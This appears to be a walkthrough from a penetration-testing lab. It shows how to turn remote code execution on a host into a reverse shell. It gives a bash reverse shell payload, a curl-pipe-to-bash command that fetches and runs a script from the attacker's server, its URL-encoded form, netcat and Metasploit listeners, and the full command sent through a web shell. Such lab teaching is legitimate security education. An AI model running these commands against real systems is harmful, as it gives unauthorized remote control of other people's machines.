
Now that you have escaped the container and have RCE on the host, you need to create a reverse shell and obtain a way to gain a stable shell onto the box.  

There are several ways to obtain a reverse shell on a box once you have RCE. Outlined below are a few of the most common methods used.  

- netcat
- bash
- python
- perl

For more information about various payloads and reverse shells, you can use check out these two resources. [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

In this task, we will be covering how to use a basic bash reverse shell along with URL encoding to drop a script directly into bash. Using URL encoding to our advantage, we can ease much pain when executing a payload as often special characters such as `&, ', !, ;, ?` will cause serious issues.  

To begin, we will create a simple payload by placing the below code into a `.sh` file.

`#!/bin/bash   bash -i >& /dev/tcp/tun0ip/53 0>&1`

The first line will declare that we are using the bash scripting language. The second line is the payload itself. For more information about this payload, check out this explain shell, [https://explainshell.com/explain?cmd=bash+-i+>%26+%2Fdev%2Ftcp%2F127.0.0.1%2F53+0>%261](https://explainshell.com/explain?cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F127.0.0.1%2F53+0%3E%261).  

Now that you have the payload ready to go, you can start up a local web server on your attacking machine using either _http.server_ or _updog_ or _php_. You can find example usage for all three below.  

- `python3 -m http.server 80`
- `updog`
- `php -S 0.0.0.0:80`

Once you have a server started hosting the file, we can compile a command to execute the file. Find the command below.  

Unencoded command: `curl http://10.x.x.x:80/shellscript.sh|bash &`

As we have already mentioned, special characters can cause issues within URLs. To combat this, we can utilize URL encoding on any special characters. Find the encoded command below.

Encoded command: `curl%20http%3A%2F%2F10.x.x.x%3A80%2Fshellscript.sh%7Cbash%20%26`

The above command is entirely ready to go. You will only need to change the IP address and the file name within the command; this does not require you to change any of the URL encoding present.

You can now start a listener using Netcat or Metasploit to catch your reverse shell once executed. Find commands below to start listeners.  

- `nc -lvnp 53`
- `use exploit/multi/handler`

Now that you have the full payload and execution command ready, you can use it and the RCE to gain a shell onto the box. Find the full command below.  

Command used: `curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.x.x.x%3A80%2Fshellscript.sh%7Cbash%20%26'`


---

# Your job
